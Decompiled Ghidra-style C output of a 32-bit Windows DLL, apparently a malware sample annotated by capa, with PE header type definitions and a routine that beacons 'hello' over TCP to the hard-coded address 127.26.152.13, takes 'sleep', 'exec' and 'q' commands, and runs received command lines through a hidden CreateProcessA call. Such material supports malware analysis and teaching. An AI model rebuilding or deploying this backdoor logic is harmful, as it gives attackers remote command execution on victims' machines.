typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned int    undefined4;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef unsigned short    word;
typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void * UniqueProcess;
    void * UniqueThread;
};

typedef ushort WORD;

typedef int BOOL;

typedef uchar BYTE;

typedef void * LPVOID;

typedef ulong DWORD;

typedef BYTE * LPBYTE;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_DIRECTORY_ENTRY_EXPORT IMAGE_DIRECTORY_ENTRY_EXPORT, *PIMAGE_DIRECTORY_ENTRY_EXPORT;

struct IMAGE_DIRECTORY_ENTRY_EXPORT {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    dword Name;
    dword Base;
    dword NumberOfFunctions;
    dword NumberOfNames;
    dword AddressOfFunctions;
    dword AddressOfNames;
    dword AddressOfNameOrdinals;
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef char CHAR;

typedef CHAR * LPSTR;

typedef void * HANDLE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _PROCESS_INFORMATION _PROCESS_INFORMATION, *P_PROCESS_INFORMATION;

struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _PROCESS_INFORMATION * LPPROCESS_INFORMATION;

typedef struct _STARTUPINFOA * LPSTARTUPINFOA;

typedef struct _SECURITY_ATTRIBUTES * LPSECURITY_ATTRIBUTES;

typedef CHAR * LPCSTR;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef uint size_t;




undefined4
capa::communication::tcp::client::fun_FUN_10001010
          (undefined param_1,undefined param_2,undefined param_3,undefined param_4,undefined param_5
          ,undefined param_6,undefined param_7,undefined param_8,undefined param_9,
          undefined param_10,undefined1 param_11,undefined param_12)

{
  char cVar1;
  HANDLE pvVar2;
  int iVar3;
  char *pcVar4;
  undefined4 *puVar5;
  undefined1 unaff_retaddr;
  char in_stack_000001d0;
  int in_stack_00001200;
  
  FUN_10001220(unaff_retaddr);
  if (in_stack_00001200 == 1) {
    puVar5 = (undefined4 *)&param_12;
    for (iVar3 = 0x3ff; iVar3 != 0; iVar3 = iVar3 + -1) {
      *puVar5 = 0;
      puVar5 = puVar5 + 1;
    }
    *(undefined2 *)puVar5 = 0;
    *(undefined *)((int)puVar5 + 2) = 0;
    pvVar2 = OpenMutexA(0x1f0001,0,s_SADFHUHF_10026038);
    if (pvVar2 == (HANDLE)0x0) {
      CreateMutexA((LPSECURITY_ATTRIBUTES)0x0,0,s_SADFHUHF_10026038);
      iVar3 = Ordinal_115();
      if (iVar3 == 0) {
        iVar3 = Ordinal_23();
        if (iVar3 != -1) {
          Ordinal_11();
          Ordinal_9();
          iVar3 = Ordinal_4();
          if (iVar3 != -1) {
LAB_100010e9:
            do {
              iVar3 = -1;
              pcVar4 = s_hello_10026020;
              do {
                if (iVar3 == 0) break;
                iVar3 = iVar3 + -1;
                cVar1 = *pcVar4;
                pcVar4 = pcVar4 + 1;
              } while (cVar1 != '\0');
              iVar3 = Ordinal_19();
              if ((iVar3 == -1) || (iVar3 = Ordinal_22(), iVar3 == -1)) goto LAB_100011db;
              iVar3 = Ordinal_16();
            } while (iVar3 < 1);
            iVar3 = strncmp(s_sleep_10026018,&stack0x000001d0,5);
            if (iVar3 == 0) {
              Sleep(0x60000);
              goto LAB_100010e9;
            }
            iVar3 = strncmp(&DAT_10026010,&stack0x000001d0,4);
            if (iVar3 == 0) {
              puVar5 = (undefined4 *)&stack0xfffffffc;
              for (iVar3 = 0x11; iVar3 != 0; iVar3 = iVar3 + -1) {
                *puVar5 = 0;
                puVar5 = puVar5 + 1;
              }
              CreateProcessA((LPCSTR)0x0,&stack0x000001d5,(LPSECURITY_ATTRIBUTES)0x0,
                             (LPSECURITY_ATTRIBUTES)0x0,1,0x8000000,(LPVOID)0x0,(LPCSTR)0x0,
                             (LPSTARTUPINFOA)&stack0xfffffffc,
                             (LPPROCESS_INFORMATION)&stack0xffffffec);
              goto LAB_100010e9;
            }
            if (in_stack_000001d0 != 'q') {
              Sleep(0x60000);
              goto LAB_100010e9;
            }
            CloseHandle(s_127_26_152_13_10026028);
          }
LAB_100011db:
          Ordinal_3();
        }
        Ordinal_116();
      }
    }
  }
  return 1;
}



// WARNING: Unable to track spacebase fully for stack

void FUN_10001220(undefined1 param_1)

{
  uint in_EAX;
  undefined1 *puVar1;
  undefined4 unaff_retaddr;
  
  puVar1 = &param_1;
  if (0xfff < in_EAX) {
    do {
      puVar1 = puVar1 + -0x1000;
      in_EAX = in_EAX - 0x1000;
    } while (0xfff < in_EAX);
  }
  *(undefined4 *)(puVar1 + (-4 - in_EAX)) = unaff_retaddr;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_1000124f(undefined4 param_1,int param_2)

{
  undefined4 uVar1;
  code **_Memory;
  code **ppcVar2;
  
  if (param_2 == 0) {
    if (0 < _DAT_10026058) {
      _DAT_10026058 = _DAT_10026058 + -1;
      goto LAB_10001265;
    }
LAB_1000128d:
    uVar1 = 0;
  }
  else {
LAB_10001265:
    _DAT_1002605c = *(undefined4 *)_adjust_fdiv_exref;
    if (param_2 == 1) {
      DAT_10026064 = (code **)malloc(0x80);
      if (DAT_10026064 == (code **)0x0) goto LAB_1000128d;
      *DAT_10026064 = (code *)0x0;
      DAT_10026060 = DAT_10026064;
      _initterm(&DAT_10026000,&DAT_10026004);
      _DAT_10026058 = _DAT_10026058 + 1;
    }
    else if ((param_2 == 0) &&
            (_Memory = DAT_10026064, ppcVar2 = DAT_10026060, DAT_10026064 != (code **)0x0)) {
      while (ppcVar2 = ppcVar2 + -1, _Memory <= ppcVar2) {
        if (*ppcVar2 != (code *)0x0) {
          (**ppcVar2)();
          _Memory = DAT_10026064;
        }
      }
      free(_Memory);
      DAT_10026064 = (code **)0x0;
    }
    uVar1 = 1;
  }
  return uVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int entry(undefined4 param_1,int param_2,undefined4 param_3)

{
  int iVar1;
  int iVar2;
  int iVar3;
  undefined unaff_BL;
  undefined unaff_BP;
  undefined unaff_SI;
  undefined unaff_DI;
  undefined unaff_retaddr;
  undefined1 in_stack_000001d8;
  undefined1 in_stack_000001d9;
  
  iVar1 = param_2;
  iVar2 = _DAT_10026058;
  if (param_2 != 0) {
    if ((param_2 != 1) && (param_2 != 2)) goto LAB_10001342;
    if ((DAT_10026068 != (code *)0x0) &&
       (iVar2 = (*DAT_10026068)(param_1,param_2,param_3), iVar2 == 0)) {
      return 0;
    }
    iVar2 = FUN_1000124f(param_1,param_2);
  }
  if (iVar2 == 0) {
    return 0;
  }
LAB_10001342:
  iVar2 = capa::communication::tcp::client::fun_FUN_10001010
                    ((char)param_1,(char)param_2,(char)param_3,unaff_DI,unaff_SI,unaff_BL,unaff_BP,
                     unaff_retaddr,(char)param_1,(char)param_2,in_stack_000001d8,in_stack_000001d9);
  if (param_2 == 1) {
    if (iVar2 != 0) {
      return iVar2;
    }
    FUN_1000124f(param_1,0);
  }
  if ((param_2 != 0) && (param_2 != 3)) {
    return iVar2;
  }
  iVar3 = FUN_1000124f(param_1,param_2);
  param_2 = iVar2;
  if (iVar3 == 0) {
    param_2 = 0;
  }
  if (param_2 != 0) {
    if (DAT_10026068 != (code *)0x0) {
      iVar2 = (*DAT_10026068)(param_1,iVar1,param_3);
      return iVar2;
    }
    return param_2;
  }
  return 0;
}



void _initterm(void)

{
                    // WARNING: Could not recover jumptable at 0x10001398. Too many branches
                    // WARNING: Treating indirect jump as call
  _initterm();
  return;
}


